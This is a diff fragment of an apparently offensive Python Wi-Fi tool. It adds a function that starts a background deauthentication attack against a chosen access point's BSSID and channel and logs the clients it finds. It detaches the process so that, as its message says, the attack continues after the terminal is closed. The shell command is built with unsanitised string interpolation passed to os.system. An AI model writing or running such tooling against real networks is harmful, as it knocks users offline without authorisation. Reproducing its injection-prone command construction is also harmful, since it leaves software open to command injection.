@@ -85,3 +85,18 @@ def choose_ap(aps):
         stop_monitor()
         sys.exit(1)
 
+# === DEAUTH MANAGEMENT ===
+def start_deauth(bssid, channel):
+    os.makedirs(SESSION_DIR, exist_ok=True)
+    # Create empty client log file if it doesn't exist
+    open(CLIENT_LOG, 'a').close()
+    
+    log_file = os.path.join(SESSION_DIR, "deauth.log")
+    cmd = f"nohup python3 background_deauth.py {MONITOR_IFACE} {bssid} {channel} {CLIENT_LOG} > {log_file} 2>&1 & echo $! > {PID_FILE}"
+    os.system(cmd)
+    success("Deauth started in background.")
+    status(f"BSSID: {bssid} | Channel: {channel}")
+    status(f"Session log: {log_file}")
+    status(f"Clients: {CLIENT_LOG}")
+    print(colored("\n[✓] You can close this terminal. Attack will continue.\n", "green"))
+
